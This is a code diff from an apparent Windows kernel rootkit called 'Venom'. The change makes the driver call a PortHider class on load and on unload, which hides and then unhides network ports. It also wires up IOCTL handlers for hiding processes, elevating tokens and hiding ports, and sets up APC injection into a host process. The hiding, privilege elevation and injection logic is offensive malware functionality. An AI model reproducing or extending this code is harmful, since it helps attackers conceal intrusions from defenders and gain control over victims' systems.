@@ -1,8 +1,8 @@
 #include "Config.h"
 #include "Capabilities/InjectionCapabilities/APCInjector.h"
+#include "Capabilities/NetworkCapabilites/PortHider.h"
 #include "IoctlHandlers.h"
 #include "Ioctl.h"
-#include "NetworkHandler.h"
 #include "Venom.h"
 
 EXTERN_C NTSTATUS
@@ -47,10 +47,10 @@ DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
 	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverObject->MajorFunction[IRP_MJ_CLOSE] = VenomCreateClose;
 	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = VenomDeviceControl;
 
-	//status = NetworkHandler::hookNsi();
-	//if (!NT_SUCCESS(status)) {
-	//	return status;
-	//}
+	status = PortHider().hide();
+	if (!NT_SUCCESS(status)) {
+		return status;
+	}
 
 	auto process = Process(VENOM_HOST_PROCESS);
 	auto apcInjector = APCInjector(process);
@@ -82,17 +82,12 @@ NTSTATUS VenomDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 	switch (static_cast<VenomIoctls>(stack->Parameters.DeviceIoControl.IoControlCode)) {
 
 	case VenomIoctls::HideProcces:
-
 		status = IoctlHandlers::HideProcess(Irp);
 		break;
-
 	case VenomIoctls::Elevate:
-
 		status = IoctlHandlers::ElevateToken(Irp);
 		break;
-
 	case VenomIoctls::HidePort:
-
 		status = IoctlHandlers::HidePort(Irp);
 		break;
 	default:
@@ -112,10 +107,5 @@ void VenomUnload(PDRIVER_OBJECT DriverObject)
 	IoDeleteSymbolicLink(&symLink);
 	IoDeleteDevice(DriverObject->DeviceObject);
 
-	//// Unhook NSI.
-	//auto status = NetworkHandler::unhookNsi();
-	//if (!NT_SUCCESS(status))
-	//{
-	//	DbgPrint("Couldn't unhook NSI");
-	//}
+	PortHider().unhide();
 }
